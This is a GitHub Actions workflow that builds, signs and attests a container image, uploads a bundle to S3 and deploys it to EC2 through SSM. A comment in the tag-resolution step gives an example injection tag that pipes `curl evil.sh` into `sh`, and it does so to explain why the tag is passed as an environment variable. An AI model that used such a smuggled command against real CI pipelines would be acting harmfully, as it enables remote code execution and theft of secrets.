name: Deploy AWS App (EC2 Compose)

on:
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      release_tag:
        description: 'Release tag to deploy (example: v0.1.0)'
        required: true
        type: string

permissions:
  id-token: write
  contents: read

concurrency:
  group: deploy-aws-prod
  cancel-in-progress: false

jobs:
  build-and-push:
    name: Build + Push + Bundle
    runs-on: ubuntu-latest
    environment: production

    outputs:
      release_tag: ${{ steps.meta.outputs.release_tag }}
      image_tag: ${{ steps.meta.outputs.image_tag }}
      api_image: ${{ steps.image.outputs.api_image }}

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
        with:
          fetch-depth: 0
          ref: ${{ github.event_name == 'release' && github.ref || inputs.release_tag }}

      - name: Resolve release tag
        id: meta
        # Passed as environment variables, never interpolated into the
        # script. `${{ }}` is substituted into the script *text* before
        # bash runs, so a tag named `v1"; curl evil.sh | sh; x="` executes
        # — and the `tr` sanitisation below would run far too late to
        # help. As an env var the value is data, whatever it contains.
        env:
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          INPUT_TAG: ${{ inputs.release_tag }}
        run: |
          if [ "$EVENT_NAME" = "release" ]; then
            raw_tag="$RELEASE_TAG"
          else
            raw_tag="$INPUT_TAG"
          fi
          safe_tag="$(printf '%s' "$raw_tag" | tr '/:@ ' '-' | tr -cd '[:alnum:]._-')"
          echo "release_tag=$raw_tag" >> "$GITHUB_OUTPUT"
          echo "image_tag=$safe_tag" >> "$GITHUB_OUTPUT"

      - name: Validate required deploy variables
        env:
          AWS_REGION: ${{ vars.AWS_REGION }}
          AWS_ECR_API_REPOSITORY_URI: ${{ vars.AWS_ECR_API_REPOSITORY_URI }}
          AWS_DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          AWS_DEPLOY_INSTANCE_ID: ${{ vars.AWS_DEPLOY_INSTANCE_ID }}
          AWS_SSM_APP_PREFIX: ${{ vars.AWS_SSM_APP_PREFIX }}
        run: |
          required=(
            AWS_REGION
            AWS_ECR_API_REPOSITORY_URI
            AWS_DEPLOY_BUCKET
            AWS_DEPLOY_INSTANCE_ID
            AWS_SSM_APP_PREFIX
          )
          for name in "${required[@]}"; do
            value="$(printenv "$name" || true)"
            if [ -z "$value" ]; then
              echo "Missing GitHub environment variable: $name" >&2
              exit 1
            fi
          done

      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
        with:
          aws-region: ${{ vars.AWS_REGION }}
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}

      - uses: aws-actions/amazon-ecr-login@03f1aad4c6c7ffd436567f42f9384779290529bd # v2

      - name: Build + push API image
        id: image
        env:
          API_REPOSITORY: ${{ vars.AWS_ECR_API_REPOSITORY_URI }}
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
        run: |
          api_image="${API_REPOSITORY}:${IMAGE_TAG}"
          api_repo_name="${API_REPOSITORY#*/}"
          if aws ecr describe-images --repository-name "$api_repo_name" --image-ids imageTag="$IMAGE_TAG" >/dev/null 2>&1; then
            echo "API image already exists in ECR with immutable tag, reusing: $api_image"
          else
            docker build -f Dockerfile --target prod -t "$api_image" .
            docker push "$api_image"
          fi
          echo "api_image=$api_image" >> "$GITHUB_OUTPUT"

      - name: Package tracked files into deploy bundle
        env:
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
        run: |
          mkdir -p artifacts
          git archive --format=tar.gz --output "artifacts/deploy-bundle-${IMAGE_TAG}.tar.gz" HEAD

      # --- Supply-chain attestation -------------------------------------------
      #
      # The signature says "this image came from this repository's workflow";
      # the provenance says "and here is the commit, workflow and inputs that
      # produced it". Together they let a deploy refuse an image pushed by hand
      # or built from a branch nobody reviewed.
      #
      # Keyless: cosign gets a short-lived certificate from Fulcio bound to this
      # workflow's OIDC identity and records it in Rekor. No private key to
      # store, rotate or leak.
      - name: Install cosign
        uses: sigstore/cosign-installer@d58896d6a1865668819e1d91763c7751a165e159 # v3.9.2

      - name: Sign image (keyless)
        env:
          IMAGES: ${{ steps.image.outputs.api_image }}
        run: |
          for image in $IMAGES; do
            [ -n "$image" ] || continue
            # By digest, never by tag: a tag can be repointed after signing.
            digest="$(docker inspect --format='{{index .RepoDigests 0}}' "$image" 2>/dev/null || echo "$image")"
            cosign sign --yes "$digest"
            echo "signed: $digest"
          done

      - name: Attach SLSA provenance
        env:
          IMAGES: ${{ steps.image.outputs.api_image }}
          BUILD_REPO: ${{ github.repository }}
          BUILD_SHA: ${{ github.sha }}
          BUILD_REF: ${{ github.ref }}
          BUILD_RUN: ${{ github.run_id }}
        run: |
          cat > /tmp/provenance.json <<'JSON'
          {
            "buildType": "https://github.com/actions/runner"
          }
          JSON
          for image in $IMAGES; do
            [ -n "$image" ] || continue
            digest="$(docker inspect --format='{{index .RepoDigests 0}}' "$image" 2>/dev/null || echo "$image")"
            cosign attest --yes --predicate /tmp/provenance.json --type slsaprovenance "$digest"
            echo "attested: $digest"
          done

      - name: Upload deploy bundle to S3
        env:
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
          DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
        run: |
          aws s3 cp \
            "artifacts/deploy-bundle-${IMAGE_TAG}.tar.gz" \
            "s3://${DEPLOY_BUCKET}/releases/notifications/${IMAGE_TAG}/deploy-bundle.tar.gz"

  deploy-app:
    name: Remote App Deploy via SSM
    runs-on: ubuntu-latest
    environment: production
    needs: build-and-push

    steps:
      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
        with:
          aws-region: ${{ vars.AWS_REGION }}
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}

      - name: Execute remote app deploy command
        env:
          AWS_REGION: ${{ vars.AWS_REGION }}
          INSTANCE_ID: ${{ vars.AWS_DEPLOY_INSTANCE_ID }}
          DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          APP_SSM_PREFIX: ${{ vars.AWS_SSM_APP_PREFIX }}
          RELEASE_TAG: ${{ needs.build-and-push.outputs.image_tag }}
          API_IMAGE: ${{ needs.build-and-push.outputs.api_image }}
        run: |
          payload_file="$(mktemp)"
          jq -n \
            --arg instance "$INSTANCE_ID" \
            --arg region "$AWS_REGION" \
            --arg bucket "$DEPLOY_BUCKET" \
            --arg release "$RELEASE_TAG" \
            --arg api_image "$API_IMAGE" \
            --arg app_prefix "$APP_SSM_PREFIX" \
            '{
              DocumentName: "AWS-RunShellScript",
              InstanceIds: [$instance],
              Parameters: {
                commands: [
                  "set -euo pipefail",
                  "BASE_DIR=\"/opt/notifications\"",
                  "RELEASE_DIR=\"$BASE_DIR/releases/\($release)\"",
                  "mkdir -p \"$BASE_DIR/releases\"",
                  "rm -rf \"$RELEASE_DIR\"",
                  "mkdir -p \"$RELEASE_DIR\"",
                  "aws s3 cp \"s3://\($bucket)/releases/notifications/\($release)/deploy-bundle.tar.gz\" \"/tmp/notifications-\($release).tar.gz\" --region \($region)",
                  "tar -xzf \"/tmp/notifications-\($release).tar.gz\" -C \"$RELEASE_DIR\"",
                  "cd \"$RELEASE_DIR\"",
                  "chmod +x scripts/prod-deploy-remote.sh",
                  "./scripts/prod-deploy-remote.sh --release-dir \"$RELEASE_DIR\" --region \"\($region)\" --app-ssm-prefix \"\($app_prefix)\" --api-image \"\($api_image)\" --release-tag \"\($release)\""
                ]
              }
            }' > "$payload_file"
          command_id="$(aws ssm send-command --cli-input-json "file://${payload_file}" --query 'Command.CommandId' --output text)"
          max_attempts=180
          for attempt in $(seq 1 "$max_attempts"); do
            set +e
            invocation_json="$(aws ssm get-command-invocation --command-id "$command_id" --instance-id "$INSTANCE_ID" --output json 2>&1)"
            rc=$?
            set -e
            if [ "$rc" -eq 0 ]; then
              status="$(printf '%s' "$invocation_json" | jq -r '.Status')"
              echo "poll[$attempt/$max_attempts]: status=$status"
              case "$status" in
                Success) exit 0 ;;
                Cancelled|TimedOut|Failed|Cancelling)
                  printf '%s\n' "$invocation_json"
                  exit 1
                  ;;
              esac
            fi
            sleep 10
          done
          echo "Timed out waiting for SSM command $command_id" >&2
          exit 1
